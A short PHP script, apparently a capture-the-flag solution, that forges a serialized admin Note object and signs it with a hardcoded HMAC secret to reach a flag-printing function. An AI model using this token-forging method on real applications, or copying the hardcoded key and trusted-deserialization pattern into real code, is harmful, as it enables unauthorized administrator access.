<?php
class Note {
    public function __construct($admin) {
        $this->notes = array();
        $this->isadmin = $admin;
    }
    public function addnote($title, $body) {
        array_push($this->notes, [$title, $body]);
    }
    public function getnotes() {
        return $this->notes;
    }
    public function getflag() {
        if ($this->isadmin === true) {
            echo FLAG;
        }
    }
}

function hmac($data) {
    $secret = "2532bd172578d19923e5348420e02320";
    if (empty($data) || empty($secret)) return false;
    return hash_hmac('sha256', $data, $secret);
}

$note = new Note(true);
$data = base64_encode(serialize($note));

// string(68) "Tzo0OiJOb3RlIjoyOntzOjU6Im5vdGVzIjthOjA6e31zOjc6ImlzYWRtaW4iO2I6MTt9"
var_dump((string)$data);
// string(64) "b6b6aa1a1732e8c83fddf6564acb50c94f59d9eaa4d6ccf4ac8ed494bb11c71f"
var_dump((string)hmac($data));
?>
